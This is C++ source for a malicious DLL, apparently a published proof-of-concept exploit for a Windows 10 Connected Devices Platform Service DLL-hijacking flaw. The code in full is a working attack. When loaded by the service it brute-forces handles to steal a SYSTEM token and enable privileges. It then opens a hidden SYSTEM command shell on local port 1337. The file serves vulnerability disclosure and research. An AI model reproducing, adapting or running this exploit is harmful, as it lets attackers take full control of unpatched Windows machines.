/*
* Title:..........: Windows 10 CDPSvc DLL Hijacking LPE - From LOCAL SERVICE to SYSTEM
* Filename........: cdpsgshims.cpp
* GitHub..........: https://github.com/itm4n/CDPSvcDllHijacking
* Date............: 2019-12-10
* Author..........:	Clement Labro (@itm4n)
* Description.....: In Windows 10, the Connected Devices Platform Service (CDPSvc) tries to load 
*                   the missing cdpsgshims.dll DLL with a call to LoadLibraryEx() without 
*                   specifying its absolute path. Therefore it's potentially vulerable to DLL 
*                   planting in PATH directories. Withe the ability to execute arbitrary code
*                   in the context of the service as LOCAL SERVICE, it is possible to bruteforce
*                   open handles in order to find a valid SYSTEM impersonation token Handle. 
* Tested on.......: Windows 10 64bits 1903 (18362.1.amd64fre.19h1_release.190318-1202)
* Credit..........: https://github.com/Re4son/Churrasco/ (Token Kidnapping)
*                   https://github.com/ohpe/juicy-potato/ (Impersonation)
*/

#pragma comment(lib,"Ws2_32.lib")

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <Windows.h>
#include <lmcons.h>
#include <strsafe.h>
#include <sddl.h>

#pragma warning( disable : 4267 )
#pragma warning( disable : 6387 )

#define DEBUG TRUE
#define BINDPORT 1337
#define BUFSIZE 1024

BOOL IsValidToken(HANDLE hToken);
BOOL IsSystemToken(HANDLE hToken);
BOOL IsTokenWithDebugPrivilege(HANDLE hToken);
HANDLE FindToken();
BOOL EnablePrivilege(LPCWSTR pwszPrivName);
DWORD WINAPI ExploitThread(LPVOID lpParameter);
void StartExploitThread();

typedef struct ThreadData {
	USHORT port;
} THREADDATA, * PTHREADDATA;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		StartExploitThread();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

void StartExploitThread()
{
	PTHREADDATA pThreadData;

	pThreadData = (PTHREADDATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(THREADDATA));
	if (pThreadData != NULL)
	{
		DWORD dwThreadId = 0;
		HANDLE hThread = INVALID_HANDLE_VALUE;

		pThreadData->port = BINDPORT;

		hThread = CreateThread(NULL, 0, ExploitThread, (void*)pThreadData, 0, &dwThreadId);
		if (hThread != NULL)
		{
			CloseHandle(hThread);
		}
	}
}

BOOL IsValidToken(HANDLE hToken)
{
	DWORD dwSize;
	TOKEN_TYPE tokenType; // Is either TokenPrimary of TokenImpersonation
	SECURITY_IMPERSONATION_LEVEL impersonationLevel;

	dwSize = sizeof(TOKEN_TYPE);

	if (GetTokenInformation(hToken, TokenType, &tokenType, dwSize, &dwSize))
	{
		if (tokenType == TokenImpersonation)
		{
			dwSize = sizeof(SECURITY_IMPERSONATION_LEVEL);

			if (GetTokenInformation(hToken, TokenImpersonationLevel, &impersonationLevel, dwSize, &dwSize))
			{
				// We want only tokens with either SecurityImpersonation or SecurityDelegation impersonation level
				if (impersonationLevel == SecurityImpersonation || impersonationLevel == SecurityDelegation)
				{
					return TRUE;
				}
			}
		}
	}

	return FALSE;
}

BOOL IsSystemToken(HANDLE hToken)
{
	DWORD dwSize;

	// First call to get the buffer size 
	if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize))
	{
		if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {

			PTOKEN_USER pTokenUser = (PTOKEN_USER)GlobalAlloc(GPTR, dwSize);
			if (pTokenUser != NULL)
			{
				// Second call to get the actual information 
				if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize))
				{
					LPWSTR pwszSid;

					ConvertSidToStringSid(pTokenUser->User.Sid, &pwszSid);

					if (pwszSid != NULL && !wcscmp(pwszSid, L"S-1-5-18"))
					{
						return TRUE;
					}
				}
			}
		}
	}

	return FALSE;
}

BOOL IsTokenWithDebugPrivilege(HANDLE hToken)
{
	LUID luid;

	if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
	{
		PRIVILEGE_SET privs;
		BOOL bPrivPresent = FALSE;

		privs.PrivilegeCount = 1;
		privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
		privs.Privilege[0].Luid = luid;
		privs.Privilege[0].Attributes = SE_PRIVILEGE_VALID_ATTRIBUTES;

		if (PrivilegeCheck(hToken, &privs, &bPrivPresent))
		{
			if (bPrivPresent)
			{
				return TRUE;
			}
		}
	}

	return FALSE;
}

HANDLE FindToken()
{
	HANDLE hTarget = INVALID_HANDLE_VALUE;
	HANDLE hTargetTmp;

	for (DWORD dwSourceHandle = 4; dwSourceHandle < 0xffff; dwSourceHandle += 4)
	{
		// This is not ideal because we may duplicate our own handles at some point. The problem is
		// that bruteforcing the handle without duplicating it first may cause access violations 
		// and random crashes. There is probably a better way but at least the exploit doesn't 
		// leave any undesired open handle behind it. 
		if (!DuplicateHandle(GetCurrentProcess(), (HANDLE)dwSourceHandle, GetCurrentProcess(), &hTargetTmp, 0, FALSE, DUPLICATE_SAME_ACCESS))
		{
			continue;
		}

		if (IsValidToken(hTargetTmp))
		{
			if (IsSystemToken(hTargetTmp))
			{
				if (hTarget != INVALID_HANDLE_VALUE)
				{
					CloseHandle(hTarget);
				}

				DuplicateHandle(GetCurrentProcess(), hTargetTmp, GetCurrentProcess(), &hTarget, 0, FALSE, DUPLICATE_SAME_ACCESS);

				if (IsTokenWithDebugPrivilege(hTarget))
				{
					break;
				}
			}
		}

		CloseHandle(hTargetTmp);
	}

	return hTarget;
}

BOOL EnablePrivilege(LPCWSTR pwszPrivName)
{
	LUID luid;
	HANDLE hToken, hProcess;
	TOKEN_PRIVILEGES tp;

	if (!LookupPrivilegeValue(NULL, pwszPrivName, &luid))
	{
		return FALSE;
	}

	hProcess = GetCurrentProcess();

	if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken))
	{
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		return FALSE;
	}

	return TRUE;
}

DWORD WINAPI ExploitThread(LPVOID lpParameter)
{
	PTHREADDATA pThreadData;
	SOCKADDR_IN sin;
	SOCKET serverSocket;
	WSADATA wsaData;
	int iResult;

	pThreadData = (PTHREADDATA)lpParameter;

	// Init WSA
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) 
	{
		return 1;
	}

	// Create server socket 
	serverSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
	if (serverSocket == INVALID_SOCKET)
	{
		WSACleanup();
		return 2;
	}

	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	sin.sin_port = htons(pThreadData->port);

	// Start server 
	bind(serverSocket, (SOCKADDR*)&sin, sizeof(SOCKADDR_IN));
	listen(serverSocket, SOMAXCONN);

	// Wait for a connection 
	SOCKET clientSocket = accept(serverSocket, 0, 0);
	if (clientSocket == INVALID_SOCKET)
	{
		closesocket(serverSocket);
		WSACleanup();
		return 3;
	}

	// We don't need the server socket anymore 
	closesocket(serverSocket);

	HANDLE hSystemToken;
	const char* msg;

	if (EnablePrivilege(SE_ASSIGNPRIMARYTOKEN_NAME))
	{
		msg = "[*] Searching for a SYSTEM token...\n";
		send(clientSocket, msg, strlen(msg), 0);

		hSystemToken = FindToken();
		if (hSystemToken != INVALID_HANDLE_VALUE)
		{
			msg = "[+] SYSTEM token found.\n";
			send(clientSocket, msg, strlen(msg), 0);

			if (IsTokenWithDebugPrivilege(hSystemToken))
			{
				msg = "[+] Token has SeDebugPrivilege!\n";
				send(clientSocket, msg, strlen(msg), 0);
			}
			else
			{
				msg = "[!] Couldn't find a token with SeDebugPrivilege.\n";
				send(clientSocket, msg, strlen(msg), 0);
			}

			HANDLE hSystemTokenDup;

			if (DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
			{
				// Start a new process using the SYSTEM token and map stdin / stdout / stderr to 
				// the client socket. 
				PROCESS_INFORMATION pInfo;
				STARTUPINFO sInfo;
				LPWSTR pwszComspec;
				LPWSTR pwszSystemDir;

				ZeroMemory(&sInfo, sizeof(STARTUPINFO));
				ZeroMemory(&pInfo, sizeof(PROCESS_INFORMATION));

				sInfo.cb = sizeof(STARTUPINFO);
				sInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
				sInfo.wShowWindow = SW_HIDE;
				sInfo.hStdOutput = (HANDLE)clientSocket;
				sInfo.hStdError = (HANDLE)clientSocket;
				sInfo.hStdInput = (HANDLE)clientSocket;

				pwszComspec = (LPWSTR)malloc(BUFSIZE * sizeof(WCHAR));
				GetEnvironmentVariable(L"comspec", pwszComspec, BUFSIZE);

				pwszSystemDir = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
				GetSystemDirectory(pwszSystemDir, MAX_PATH);

				if (CreateProcessAsUser(hSystemTokenDup, pwszComspec, NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, pwszSystemDir, &sInfo, &pInfo))
				{
					msg = "[+] CreateProcessAsUser() OK\n";
					send(clientSocket, msg, strlen(msg), 0);

					closesocket(serverSocket);

					CloseHandle(pInfo.hProcess);
					CloseHandle(pInfo.hThread);
				}
				else
				{
					msg = "[-] CreateProcessAsUser() failed.\n";
					send(clientSocket, msg, strlen(msg), 0);
				}

				CloseHandle(hSystemTokenDup);
			}
			else
			{
				msg = "[-] DuplicateTokenEx() failed.\n";
				send(clientSocket, msg, strlen(msg), 0);
			}

			CloseHandle(hSystemToken);
		}
		else
		{
			msg = "[-] Failed to find a valid SYSTEM token.\n";
			send(clientSocket, msg, strlen(msg), 0);
		}
	}
	else
	{
		msg = "[-] Failed to enable 'SeAssignPrimaryTokenPrivilege'.\n";
		send(clientSocket, msg, strlen(msg), 0);
	}

	closesocket(clientSocket);

	WSACleanup();

	return 0;
}

